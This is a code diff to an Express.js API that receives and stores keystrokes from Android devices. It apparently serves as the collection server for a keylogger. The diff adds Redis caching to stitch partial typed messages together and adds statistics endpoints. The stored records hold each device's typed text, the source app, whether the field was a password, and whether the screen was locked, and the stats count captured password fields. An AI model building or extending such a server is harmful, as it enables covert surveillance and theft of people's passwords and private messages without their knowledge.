@@ -2,8 +2,9 @@ const express = require('express');
 const router = express.Router();
 const TextInput = require('../models/TextInput');
 const { authenticateApiKey } = require('../middleware/auth');
+const cacheService = require('../services/cacheService');
 
-// POST /api/text-inputs - Save text input
+// POST /api/text-inputs - Save text input with Redis cache
 router.post('/', authenticateApiKey, async (req, res) => {
     try {
         // Log full payload received
@@ -40,235 +41,197 @@ router.post('/', authenticateApiKey, async (req, res) => {
             });
         }
 
-        // Sanitize data to prevent MongoDB validation errors
-        const sanitizeValue = (value) => {
-            if (value === null || value === undefined) return null;
-            if (typeof value === 'object') {
-                try {
-                    return JSON.parse(JSON.stringify(value));
-                } catch (e) {
-                    return String(value);
-                }
-            }
-            return value;
-        };
+        // Check if this is a complete message or partial update
+        if (inputType === 'complete_message') {
+            // Complete message - save directly to database
+            console.log('📤 Complete message received, saving directly to DB');
+            
+            const textInputData = await saveTextInputToDB({
+                id, timestamp, packageName, appName, deviceId,
+                keyboardInput, inputField, inputType, screenTitle, fieldHint,
+                isPassword, isScreenLocked, activityName, viewId, deviceModel, androidVersion
+            });
 
-        // Create text input data matching the simplified keyboard input model
-        const incoming = {
-            id: sanitizeValue(id),
-            timestamp: timestamp ? new Date(timestamp) : new Date(),
-            packageName: sanitizeValue(packageName),
-            appName: sanitizeValue(appName),
-            deviceId: sanitizeValue(deviceId),
+            return res.status(201).json({
+                success: true,
+                message: 'Complete message saved successfully',
+                data: textInputData
+            });
+        } else {
+            // Partial message - use Redis cache system
+            console.log('📝 Partial message received, checking cache');
             
-            // KEYBOARD INPUT DATA (PRIMARY FOCUS)
-            keyboardInput: sanitizeValue(keyboardInput) || '',
-            inputField: sanitizeValue(inputField) || 'text_input',
-            inputType: sanitizeValue(inputType) || 'text',
-            
-            // CONTEXT INFORMATION (MINIMAL)
-            screenTitle: sanitizeValue(screenTitle) || null,
-            fieldHint: sanitizeValue(fieldHint) || null,
-            isPassword: isPassword || false,
-            isScreenLocked: isScreenLocked || false,
-            
-            // APP CONTEXT (MINIMAL)
-            activityName: sanitizeValue(activityName) || '',
-            viewId: sanitizeValue(viewId) || '',
-            
-            // DEVICE INFO (MINIMAL)
-            deviceModel: sanitizeValue(deviceModel) || '',
-            androidVersion: sanitizeValue(androidVersion) || ''
-        };
+            const cacheResult = await cacheService.checkAndUpdateMessage(
+                deviceId, packageName, viewId, keyboardInput
+            );
 
-        console.log('🧾 Prepared incoming text-input document:', JSON.stringify(incoming, null, 2));
-
-        // Preserve longest keyboardInput per id to avoid overwriting full input with partials
-        const existing = await TextInput.findOne({ id: incoming.id }).lean();
-        if (existing) {
-            const existingInputLen = (existing.keyboardInput || '').length;
-            const incomingInputLen = (incoming.keyboardInput || '').length;
-            if (incomingInputLen < existingInputLen) {
-                console.log(`↩️ Incoming keyboardInput shorter (${incomingInputLen}) than existing (${existingInputLen}) for id=${incoming.id}. Keeping existing input.`);
-                incoming.keyboardInput = existing.keyboardInput;
+            if (cacheResult.shouldUpdate) {
+                // Previous message was saved to DB, new message started in cache
+                return res.status(201).json({
+                    success: true,
+                    message: 'Previous message completed and saved, new message cached',
+                    data: { cached: true, messageCount: 1 }
+                });
+            } else if (cacheResult.isPartOfExisting) {
+                // Message updated in cache
+                return res.status(200).json({
+                    success: true,
+                    message: 'Message updated in cache',
+                    data: { 
+                        cached: true, 
+                        updateCount: cacheResult.cachedMessage.updateCount,
+                        messageLength: cacheResult.cachedMessage.currentText.length
+                    }
+                });
+            } else {
+                // New message started in cache
+                return res.status(200).json({
+                    success: true,
+                    message: 'New message cached',
+                    data: { cached: true, messageLength: keyboardInput.length }
+                });
             }
         }
-
-        // Upsert
-        const result = await TextInput.findOneAndUpdate(
-            { id: incoming.id },
-            { $set: incoming, $setOnInsert: { createdAt: new Date() } },
-            { upsert: true, new: true, runValidators: true }
-        );
-
-        console.log('✅ Text input saved:', result.id);
-
-        res.status(200).json({
-            success: true,
-            message: 'Keyboard input saved successfully',
-            data: {
-                id: result._id,
-                textInputId: result.id,
-                keyboardInput: result.keyboardInput,
-                inputField: result.inputField,
-                inputType: result.inputType,
-                packageName: result.packageName,
-                appName: result.appName,
-                timestamp: result.timestamp
-            }
-        });
 
     } catch (error) {
-        console.error('❌ Error saving text input:', error);
-        
-        // Handle specific MongoDB validation errors
-        if (error.name === 'ValidationError') {
-            const validationErrors = Object.values(error.errors).map(err => err.message);
-            return res.status(400).json({
-                success: false,
-                message: 'Validation error',
-                errors: validationErrors
-            });
-        }
-        
-        // Handle duplicate key errors
-        if (error.code === 11000) {
-            return res.status(409).json({
-                success: false,
-                message: 'Text input already exists',
-                duplicateKey: error.keyValue
-            });
-        }
-        
+        console.error('❌ Error processing text input:', error);
         res.status(500).json({
             success: false,
-            message: 'Internal server error',
-            error: error.message
+            message: 'Failed to process text input',
+            error: process.env.NODE_ENV === 'development' ? error.message : 'Internal server error'
         });
     }
 });
 
-// GET /api/text-inputs - Get all text inputs
+// Helper function to save text input to database
+async function saveTextInputToDB(data) {
+    // Sanitize data to prevent MongoDB validation errors
+    const sanitizeValue = (value) => {
+        if (value === null || value === undefined) return null;
+        if (typeof value === 'object') {
+            try {
+                return JSON.parse(JSON.stringify(value));
+            } catch (e) {
+                return String(value);
+            }
+        }
+        return value;
+    };
+
+    // Create text input data matching the simplified keyboard input model
+    const incoming = {
+        id: sanitizeValue(data.id),
+        timestamp: data.timestamp ? new Date(data.timestamp) : new Date(),
+        packageName: sanitizeValue(data.packageName),
+        appName: sanitizeValue(data.appName),
+        deviceId: sanitizeValue(data.deviceId),
+        
+        // KEYBOARD INPUT DATA (PRIMARY FOCUS)
+        keyboardInput: sanitizeValue(data.keyboardInput) || '',
+        inputField: sanitizeValue(data.inputField) || 'text_input',
+        inputType: sanitizeValue(data.inputType) || 'complete_message',
+        
+        // CONTEXT INFORMATION (MINIMAL)
+        screenTitle: sanitizeValue(data.screenTitle) || null,
+        fieldHint: sanitizeValue(data.fieldHint) || null,
+        isPassword: data.isPassword || false,
+        isScreenLocked: data.isScreenLocked || false,
+        
+        // APP CONTEXT (MINIMAL)
+        activityName: sanitizeValue(data.activityName) || '',
+        viewId: sanitizeValue(data.viewId) || '',
+        
+        // DEVICE INFO (MINIMAL)
+        deviceModel: sanitizeValue(data.deviceModel) || '',
+        androidVersion: sanitizeValue(data.androidVersion) || ''
+    };
+
+    console.log('🧾 Prepared incoming text-input document:', JSON.stringify(incoming, null, 2));
+
+    // Preserve longest keyboardInput per id to avoid overwriting full input with partials
+    const existing = await TextInput.findOne({ id: incoming.id }).lean();
+    if (existing) {
+        const existingInputLen = (existing.keyboardInput || '').length;
+        const incomingInputLen = (incoming.keyboardInput || '').length;
+        if (incomingInputLen < existingInputLen) {
+            console.log(`↩️ Incoming keyboardInput shorter (${incomingInputLen}) than existing (${existingInputLen}) for id=${incoming.id}. Keeping existing input.`);
+            incoming.keyboardInput = existing.keyboardInput;
+        }
+    }
+
+    // Upsert
+    const result = await TextInput.findOneAndUpdate(
+        { id: incoming.id },
+        { $set: incoming, $setOnInsert: { createdAt: new Date() } },
+        { upsert: true, new: true, runValidators: true }
+    );
+
+    console.log('✅ Text input saved:', result.id);
+
+    return {
+        id: result._id,
+        textInputId: result.id,
+        keyboardInput: result.keyboardInput,
+        inputField: result.inputField,
+        inputType: result.inputType,
+        packageName: result.packageName,
+        appName: result.appName,
+        timestamp: result.timestamp
+    };
+}
+
+// GET /api/text-inputs - Get text inputs with cache stats
 router.get('/', authenticateApiKey, async (req, res) => {
     try {
-        const { 
-            page = 1, 
-            limit = 50, 
-            packageName, 
-            deviceId, 
-            startDate, 
-            endDate,
-            isPassword,
-            inputType,
-            search 
-        } = req.query;
-
-        // Build filter object
+        const { deviceId, packageName, inputType, limit = 50, offset = 0 } = req.query;
+        
+        // Build filter
         const filter = {};
-        
-        if (packageName) filter.packageName = packageName;
         if (deviceId) filter.deviceId = deviceId;
-        if (isPassword !== undefined) filter.isPassword = isPassword === 'true';
+        if (packageName) filter.packageName = packageName;
         if (inputType) filter.inputType = inputType;
-        
-        // Date range filter
-        if (startDate || endDate) {
-            filter.timestamp = {};
-            if (startDate) filter.timestamp.$gte = new Date(startDate);
-            if (endDate) filter.timestamp.$lte = new Date(endDate);
-        }
-        
-        // Text search
-        if (search) {
-            filter.$or = [
-                { keyboardInput: { $regex: search, $options: 'i' } },
-                { inputField: { $regex: search, $options: 'i' } },
-                { screenTitle: { $regex: search, $options: 'i' } },
-                { fieldHint: { $regex: search, $options: 'i' } }
-            ];
-        }
 
-        const pageNum = parseInt(page);
-        const limitNum = parseInt(limit);
-        const skip = (pageNum - 1) * limitNum;
-
+        // Get text inputs from database
         const textInputs = await TextInput.find(filter)
             .sort({ timestamp: -1 })
-            .skip(skip)
-            .limit(limitNum)
+            .limit(parseInt(limit))
+            .skip(parseInt(offset))
             .lean();
 
-        const total = await TextInput.countDocuments(filter);
+        // Get cache statistics
+        const cacheStats = await cacheService.getCacheStats();
 
         res.status(200).json({
             success: true,
-            data: {
-                textInputs,
-                pagination: {
-                    page: pageNum,
-                    limit: limitNum,
-                    total,
-                    pages: Math.ceil(total / limitNum)
-                }
-            }
+            count: textInputs.length,
+            cacheStats: cacheStats,
+            textInputs: textInputs
         });
 
     } catch (error) {
-        console.error('Error fetching text inputs:', error);
+        console.error('❌ Error fetching text inputs:', error);
         res.status(500).json({
             success: false,
-            message: 'Internal server error',
-            error: error.message
+            message: 'Failed to fetch text inputs',
+            error: process.env.NODE_ENV === 'development' ? error.message : 'Internal server error'
         });
     }
 });
 
-// GET /api/text-inputs/stats - Get statistics
+// GET /api/text-inputs/stats - Get statistics with cache info
 router.get('/stats', authenticateApiKey, async (req, res) => {
     try {
-        const { deviceId, packageName, startDate, endDate } = req.query;
-
-        // Build filter object
-        const filter = {};
-        if (deviceId) filter.deviceId = deviceId;
-        if (packageName) filter.packageName = packageName;
-        
-        // Date range filter
-        if (startDate || endDate) {
-            filter.timestamp = {};
-            if (startDate) filter.timestamp.$gte = new Date(startDate);
-            if (endDate) filter.timestamp.$lte = new Date(endDate);
-        }
-
-        const stats = await TextInput.aggregate([
-            { $match: filter },
-            {
-                $group: {
-                    _id: null,
-                    totalKeyboardInputs: { $sum: 1 },
-                    uniqueApps: { $addToSet: '$packageName' },
-                    uniqueDevices: { $addToSet: '$deviceId' },
-                    passwordFields: { $sum: { $cond: ['$isPassword', 1, 0] } },
-                    avgInputLength: { $avg: { $strLenCP: '$keyboardInput' } },
-                    inputTypes: { $addToSet: '$inputType' }
-                }
-            },
-            {
-                $project: {
-                    _id: 0,
-                    totalKeyboardInputs: 1,
-                    uniqueApps: { $size: '$uniqueApps' },
-                    uniqueDevices: { $size: '$uniqueDevices' },
-                    passwordFields: 1,
-                    avgInputLength: { $round: ['$avgInputLength', 2] },
-                    inputTypes: { $size: '$inputTypes' }
-                }
-            }
+        // Get database statistics
+        const totalKeyboardInputs = await TextInput.countDocuments();
+        const passwordFields = await TextInput.countDocuments({ isPassword: true });
+        const uniqueApps = await TextInput.distinct('packageName');
+        const uniqueDevices = await TextInput.distinct('deviceId');
+        const avgInputLength = await TextInput.aggregate([
+            { $group: { _id: null, avgLength: { $avg: { $strLenCP: '$keyboardInput' } } } }
         ]);
 
         // Get app breakdown
         const appBreakdown = await TextInput.aggregate([
-            { $match: filter },
             {
                 $group: {
                     _id: '$packageName',
@@ -278,85 +241,138 @@ router.get('/stats', authenticateApiKey, async (req, res) => {
                     avgInputLength: { $avg: { $strLenCP: '$keyboardInput' } }
                 }
             },
-            { $sort: { count: -1 } },
-            { $limit: 10 }
+            { $sort: { count: -1 } }
         ]);
+
+        // Get input types breakdown
+        const inputTypes = await TextInput.distinct('inputType');
+
+        // Get cache statistics
+        const cacheStats = await cacheService.getCacheStats();
 
         res.status(200).json({
             success: true,
             data: {
-                stats: stats[0] || {
-                    totalKeyboardInputs: 0,
-                    uniqueApps: 0,
-                    uniqueDevices: 0,
-                    passwordFields: 0,
-                    avgInputLength: 0,
-                    inputTypes: 0
+                stats: {
+                    totalKeyboardInputs,
+                    passwordFields,
+                    uniqueApps: uniqueApps.length,
+                    uniqueDevices: uniqueDevices.length,
+                    avgInputLength: avgInputLength[0]?.avgLength || 0,
+                    inputTypes: inputTypes.length
                 },
-                appBreakdown
+                appBreakdown,
+                cacheStats
             }
         });
 
     } catch (error) {
-        console.error('Error fetching text input stats:', error);
+        console.error('❌ Error fetching text input statistics:', error);
         res.status(500).json({
             success: false,
-            message: 'Internal server error',
+            message: 'Failed to fetch text input statistics',
+            error: process.env.NODE_ENV === 'development' ? error.message : 'Internal server error'
+        });
+    }
+});
+
+// POST /api/text-inputs/complete-cache - Force complete all cached messages
+router.post('/complete-cache', authenticateApiKey, async (req, res) => {
+    try {
+        await cacheService.completeAllPendingMessages();
+        
+        res.status(200).json({
+            success: true,
+            message: 'All cached messages completed and saved to database'
+        });
+    } catch (error) {
+        console.error('❌ Error completing cached messages:', error);
+        res.status(500).json({
+            success: false,
+            message: 'Failed to complete cached messages',
+            error: process.env.NODE_ENV === 'development' ? error.message : 'Internal server error'
+        });
+    }
+});
+
+// GET /api/text-inputs/cache-stats - Get detailed cache statistics
+router.get('/cache-stats', authenticateApiKey, async (req, res) => {
+    try {
+        const cacheStats = await cacheService.getCacheStats();
+        
+        res.status(200).json({
+            success: true,
+            cacheStats
+        });
+    } catch (error) {
+        console.error('❌ Error fetching cache statistics:', error);
+        res.status(500).json({
+            success: false,
+            message: 'Failed to fetch cache statistics',
+            error: process.env.NODE_ENV === 'development' ? error.message : 'Internal server error'
+        });
+    }
+});
+
+// GET /api/text-inputs/cache-stats/:deviceId - Get cache statistics for specific device
+router.get('/cache-stats/:deviceId', authenticateApiKey, async (req, res) => {
+    try {
+        const { deviceId } = req.params;
+        const deviceCacheStats = await cacheService.getDeviceCacheStats(deviceId);
+        
+        res.status(200).json({
+            success: true,
+            deviceCacheStats
+        });
+    } catch (error) {
+        console.error('❌ Error fetching device cache statistics:', error);
+        res.status(500).json({
+            success: false,
+            message: 'Failed to fetch device cache statistics',
+            error: process.env.NODE_ENV === 'development' ? error.message : 'Internal server error'
+        });
+    }
+});
+
+// POST /api/text-inputs/keep-alive - Self-ping endpoint to keep server alive
+router.post('/keep-alive', authenticateApiKey, async (req, res) => {
+    try {
+        const timestamp = new Date().toISOString();
+        console.log(`🔄 Keep-alive ping received at ${timestamp}`);
+        
+        res.status(200).json({
+            success: true,
+            message: 'Server keep-alive ping successful',
+            timestamp: timestamp,
+            serverStatus: 'active'
+        });
+    } catch (error) {
+        console.error('❌ Error in keep-alive endpoint:', error);
+        res.status(500).json({
+            success: false,
+            message: 'Keep-alive ping failed',
             error: error.message
         });
     }
 });
 
-// GET /api/text-inputs/:id - Get specific text input
-router.get('/:id', authenticateApiKey, async (req, res) => {
+// GET /api/text-inputs/keep-alive - GET version for browser compatibility
+router.get('/keep-alive', authenticateApiKey, async (req, res) => {
     try {
-        const textInput = await TextInput.findOne({ id: req.params.id });
+        const timestamp = new Date().toISOString();
+        console.log(`🔄 Keep-alive GET ping received at ${timestamp}`);
         
-        if (!textInput) {
-            return res.status(404).json({
-                success: false,
-                message: 'Text input not found'
-            });
-        }
-
         res.status(200).json({
             success: true,
-            data: textInput
+            message: 'Server keep-alive GET ping successful',
+            timestamp: timestamp,
+            serverStatus: 'active'
         });
-
     } catch (error) {
-        console.error('Error fetching text input:', error);
+        console.error('❌ Error in keep-alive GET endpoint:', error);
         res.status(500).json({
             success: false,
-            message: 'Internal server error',
-            error: error.message
-        });
-    }
-});
-
-// DELETE /api/text-inputs/:id - Delete specific text input
-router.delete('/:id', authenticateApiKey, async (req, res) => {
-    try {
-        const result = await TextInput.findOneAndDelete({ id: req.params.id });
-        
-        if (!result) {
-            return res.status(404).json({
-                success: false,
-                message: 'Text input not found'
-            });
-        }
-
-        res.status(200).json({
-            success: true,
-            message: 'Text input deleted successfully',
-            data: { id: result._id }
-        });
-
-    } catch (error) {
-        console.error('Error deleting text input:', error);
-        res.status(500).json({
-            success: false,
-            message: 'Internal server error',
+            message: 'Keep-alive GET ping failed',
             error: error.message
         });
     }
